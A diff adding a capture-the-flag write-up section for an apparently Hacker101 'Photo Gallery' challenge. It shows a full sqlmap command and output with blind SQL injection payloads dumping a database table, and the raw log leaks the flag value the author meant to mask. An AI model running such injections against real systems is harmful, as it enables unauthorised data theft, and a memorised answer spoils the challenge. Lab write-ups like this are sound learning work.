@@ -160,3 +160,97 @@ c4ca4238a0b923820dcc509a6f75849b  -
 ### Flag 6
 
 The last flag is very similar to the one right before, but deleting posts instead hijacking sessions.
+
+## Photo Gallery
+
+Flag0 -- Not Found
+
+    Consider how you might build this system yourself. What would the query for fetch look like?
+
+Flag1 -- Found
+
+    I never trust a kitten I can't see
+    Or a query whose results I can't see, for that matter
+
+Flag2 -- Not Found
+You don't have any hints for this flag yet.
+
+### Flag 0
+We could see some files using 'fetch' function. Maybe we should see some important files from here.
+
+### Flag 1
+Using SQLMAP, we can list all details for all photos, getting our flag in the name of the third photo (invisible)
+```
+kali@kali:~$ sqlmap -u http://34.74.105.127/4f10d1991c/fetch?id=1 -D level5 -T photos --dump
+        ___
+       __H__                                                                                          
+ ___ ___[)]_____ ___ ___  {1.4#stable}                                                                
+|_ -| . [.]     | .'| . |                                                                             
+|___|_  [.]_|_|_|__,|  _|                                                                             
+      |_|V...       |_|   http://sqlmap.org                                                           
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:25:04 /2020-04-17/
+
+[17:25:04] [INFO] resuming back-end DBMS 'mysql' 
+[17:25:04] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5994=5994
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 2654 FROM (SELECT(SLEEP(5)))xFjM)
+---
+[17:25:07] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[17:25:07] [INFO] fetching columns for table 'photos' in database 'level5'
+[17:25:07] [INFO] resumed: 4
+[17:25:07] [INFO] resumed: id
+[17:25:07] [INFO] resumed: title
+[17:25:07] [INFO] resumed: filename
+[17:25:07] [INFO] resumed: parent
+[17:25:07] [INFO] fetching entries for table 'photos' in database 'level5'
+[17:25:07] [INFO] fetching number of entries for table 'photos' in database 'level5'
+[17:25:07] [INFO] resumed: 3
+[17:25:07] [INFO] resumed: files/adorable.jpg
+[17:25:07] [INFO] resumed: 1
+[17:25:07] [INFO] resumed: 1
+[17:25:07] [INFO] resumed: Utterly adorable
+[17:25:07] [INFO] resumed: files/purrfect.jpg
+[17:25:07] [INFO] resumed: 2
+[17:25:07] [INFO] resumed: 1
+[17:25:07] [INFO] resumed: Purrfect
+[17:25:07] [INFO] resumed: 0b2176de68a264b8c2a6d9b2e8fd2d5d4e7703a52a0713f310034c451dc6840b
+[17:25:07] [INFO] resumed: 3
+[17:25:07] [INFO] resumed: 1
+[17:25:07] [INFO] resumed: Invisible
+[17:25:07] [INFO] recognized possible password hashes in column 'filename'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: level5
+Table: photos
+[3 entries]
++----+------------------+--------+------------------------------------------------------------------+
+| id | title            | parent | filename                                                         |
++----+------------------+--------+------------------------------------------------------------------+
+| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
+| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
+| 3  | Invisible        | 1      | 0b217xxxxxxxxxxxxxxxxxx_OUR_FLAG_xxxxxxxxxxxxxxxxx034c451dc6840b |
++----+------------------+--------+------------------------------------------------------------------+
+
+[17:25:17] [INFO] table 'level5.photos' dumped to CSV file '/home/kali/.sqlmap/output/34.74.105.127/dump/level5/photos.csv'                                                                                 
+[17:25:17] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/34.74.105.127'
+[17:25:17] [WARNING] you haven't updated sqlmap for more than 107 days!!!
+
+[*] ending @ 17:25:17 /2020-04-17/
+
+```
+
+Note that, this time, the flag has not any "^FLAG^" headers as usually.
+### Flag 2
+:(
